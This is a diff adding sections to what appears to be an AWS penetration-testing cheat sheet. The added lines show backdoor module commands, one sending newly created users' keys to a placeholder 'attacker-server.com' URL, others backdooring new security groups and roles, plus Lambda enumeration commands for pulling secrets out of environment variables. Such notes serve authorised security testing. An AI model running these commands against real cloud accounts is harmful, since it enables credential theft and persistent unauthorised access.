@@ -70,6 +70,14 @@ aws ec2 authorize-security-group-ingress --group-id sg-0315cp741b51fr4d0 --proto
 run ec2__backdoor_ec2_sec_groups --ip 1.1.1.1/32 --port-range 27017-27018 --protocol tcp --groups corp@us-west-2
 ```
 
+### Lambda to send user keys when created
+```
+run lambda__backdoor_new_users --exfil-url http://attacker-server.com/
+run lambda__backdoor_new_users --cleanup
+run lambda__backdoor_new_sec_groups
+run lambda__backdoor_new_roles
+```
+
 ## EC2
 10.0.1.1 is reserved for the gateway of the subnet, 10.0.1.2 is
 reserved for AWS DNS, and 10.0.1.3 is reserved for any future use by
@@ -94,3 +102,19 @@ aws s3 rm s3://kirit-bucket/new/abc.txt --acl public-read
 - Deploy malicious content
 
 ## Lambda
+### Read/Run permission:Exploit function to exfil data
+Check function, environment variable
+```
+aws lambda list-functions --profile LambdaReadOnlyTester
+aws lambda get-function --function-name VulnerableFunction --profile LambdaReadOnlyTester  
+```
+Check Event
+```
+aws lambda list-event-source-mappings --function-name VulnerableFunction --profile LambdaReadOnlyTester
+aws lambda get-policy --function-name VulnerableFunction --profile LambdaReadOnlyTester
+```
+The keys are in the environment variable
+Tips: If you have "lambda:InvokeFunction" you can trigger custom event and specify the exact payload.
+
+### Read&Write Permission: Privesc
+
